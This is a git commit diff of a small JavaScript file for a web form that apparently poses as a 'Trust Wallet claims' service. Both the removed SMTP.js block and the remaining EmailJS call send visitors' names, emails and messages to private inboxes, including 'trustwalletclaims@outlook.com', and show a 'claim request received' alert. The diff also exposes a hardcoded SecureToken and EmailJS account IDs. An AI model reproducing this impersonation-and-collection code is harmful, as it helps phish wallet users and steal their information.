803dd710b6cc8505b46820e5535ecdb14d7190b1
jorshDev <horladjosh@gmail.com>
2021-12-30 07:48:55 +0100

    Clean Up!

--- src/main.js
+++ src/main.js
@@ -1,22 +1,7 @@
-// const btn = document.querySelector('button');
-// const inputs = document.querySelector('form');
-// btn.addEventListener('click', () => {
-//     Email.send({
-//         SecureToken: "7c0e8619-a1b4-4b8f-8e4b-65fb83f1946c",
-//         To: "trustwalletclaims@outlook.com, horladjosh@gmail.com",
-//         From: inputs.elements["email"].value,
-//         Subject: "Response by Customer",
-//         Body: inputs.elements["message"].value + "<br>" + inputs.elements["email"].value + "<br>" +
-//             inputs.elements["name"].value
-//     }).then(msg => alert("Your claim request has been successfully received!"))
-// })
-
-
 function sendMail() {
     alert("Claim request sent!");
     var tempParams = {
         from_name: document.getElementById("name").value,
-        // to_name: document.getElementById("email").value,
         message: document.getElementById("msg").value,
     };
     emailjs.send('service_soozdyb', 'template_9hvqhzr', tempParams, 'user_UYKI72Q35QSYVNWdrhB7R').then(function(res) {
@@ -25,6 +10,4 @@ function sendMail() {
     }, (err) => {
         console.log(err);
     })
-    console.log("success", res.status)
-    alert('Heeyyyyyyyyyyy')
 }
